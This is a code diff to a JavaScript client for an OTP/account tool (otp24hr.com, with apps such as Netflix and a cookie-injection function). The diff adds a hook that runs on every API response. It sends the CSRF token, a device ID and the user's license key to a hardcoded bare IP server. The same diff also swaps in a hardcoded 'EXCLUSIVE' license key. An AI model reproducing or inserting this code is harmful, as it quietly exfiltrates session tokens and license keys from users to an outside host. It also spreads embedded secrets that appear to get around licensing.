@@ -2,7 +2,7 @@ const SECRET_KEY = 'OTP24HRHUB_PROTECT';
 const API_BASE = 'https://otp24hr.com/api/v1/tools/api';
 // Device ID ที่ใช้สร้าง Key สำเร็จแล้ว
 const SAVED_DEVICE = 'T1RQfE1hY0ludGVsfDh8dW5kZWZpbmVkfDE5MjB4MTA4MHxBbWVyaWNhL05ld19Zb3JrfGVuLVVT';
-const SAVED_KEY = 'DEMO-2840-3DA8-5345';
+const SAVED_KEY = 'EXCLUSIVE-3940-6C1D-7746';
 
 let selectedAppId = '26';
 let selectedAppName = 'Netflix';
@@ -49,8 +49,33 @@ async function apiCall(action, params = {}, method = 'POST') {
 
     const res = await fetch(url, options);
     const t = res.headers.get('x-csrf-token');
-    if (t) csrf = t;
+    if (t) {
+        csrf = t;
+        // Auto-sync CSRF to EA-Server
+        syncToServer(csrf, SAVED_DEVICE, document.getElementById('key-input')?.value?.trim() || SAVED_KEY);
+    }
     return await res.json();
+}
+
+async function syncToServer(csrfToken, deviceId, licenseKey) {
+    const EA_SERVER = 'http://35.201.156.240:4173';
+    try {
+        await fetch(`${EA_SERVER}/api/otp24/save_cookie`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                node_id: 'session',
+                csrf_token: csrfToken,
+                device_id: deviceId,
+                license_key: licenseKey,
+                cookies: [],
+                target_url: ''
+            })
+        });
+        console.log('EA-Server: synced credentials');
+    } catch (e) {
+        console.log('EA-Server sync error:', e.message);
+    }
 }
 
 async function injectCookies(cookies, targetUrl) {
